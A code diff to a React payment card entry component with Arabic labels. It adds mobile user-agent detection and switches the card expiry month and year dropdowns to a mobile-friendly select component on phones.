@@ -1,9 +1,10 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { MobileSelect, MobileSelectItem } from "@/components/ui/mobile-select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
@@ -27,6 +28,11 @@ const PaymentCardInput = () => {
   const [cvv, setCvv] = useState("");
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isMobile, setIsMobile] = useState(false);
+  
+  useEffect(() => {
+    setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+  }, []);
   
   // Get customer info and selected bank from sessionStorage
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
@@ -343,34 +349,54 @@ const PaymentCardInput = () => {
         <div className="grid grid-cols-3 gap-2 sm:gap-3">
           <div>
             <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
-            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="MM" />
-              </SelectTrigger>
-              <SelectContent className="z-50">
+            {isMobile ? (
+              <MobileSelect value={expiryMonth} onValueChange={setExpiryMonth} placeholder="MM" className="h-12 sm:h-14">
                 {months.map((month) => (
-                  <SelectItem key={month.value} value={month.value}>
+                  <MobileSelectItem key={month.value} value={month.value}>
                     {month.label}
-                  </SelectItem>
+                  </MobileSelectItem>
                 ))}
-              </SelectContent>
-            </Select>
+              </MobileSelect>
+            ) : (
+              <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
+                <SelectTrigger className="h-12 sm:h-14">
+                  <SelectValue placeholder="MM" />
+                </SelectTrigger>
+                <SelectContent>
+                  {months.map((month) => (
+                    <SelectItem key={month.value} value={month.value}>
+                      {month.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            )}
           </div>
           
           <div>
             <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
-            <Select value={expiryYear} onValueChange={setExpiryYear} required>
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="YY" />
-              </SelectTrigger>
-              <SelectContent className="z-50">
+            {isMobile ? (
+              <MobileSelect value={expiryYear} onValueChange={setExpiryYear} placeholder="YY" className="h-12 sm:h-14">
                 {years.map((year) => (
-                  <SelectItem key={year.value} value={year.value}>
+                  <MobileSelectItem key={year.value} value={year.value}>
                     {year.label}
-                  </SelectItem>
+                  </MobileSelectItem>
                 ))}
-              </SelectContent>
-            </Select>
+              </MobileSelect>
+            ) : (
+              <Select value={expiryYear} onValueChange={setExpiryYear} required>
+                <SelectTrigger className="h-12 sm:h-14">
+                  <SelectValue placeholder="YY" />
+                </SelectTrigger>
+                <SelectContent>
+                  {years.map((year) => (
+                    <SelectItem key={year.value} value={year.value}>
+                      {year.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            )}
           </div>
 
           <div>
